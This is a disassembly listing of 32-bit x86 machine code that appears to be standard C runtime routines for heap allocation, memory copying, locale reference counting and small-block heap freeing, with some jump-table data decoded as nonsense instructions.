  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
